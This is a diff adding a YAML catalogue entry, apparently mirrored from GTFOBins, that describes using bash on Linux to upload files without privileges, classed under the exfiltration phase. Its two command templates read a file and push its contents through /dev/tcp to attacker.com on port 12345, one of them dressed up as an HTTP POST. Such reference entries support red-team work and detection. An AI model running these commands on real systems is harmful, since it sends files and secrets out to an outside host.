@@ -1,0 +1,24 @@
+id: gtfobins/bash/upload/unprivileged
+type: binary
+platform: linux
+name: bash
+phases:
+- exfiltration
+capabilities:
+- file-upload
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: bash -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+- template: bash -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+references:
+- https://gtfobins.github.io/gtfobins/bash/
+tags:
+- linux
+- unix
+- gtfobins
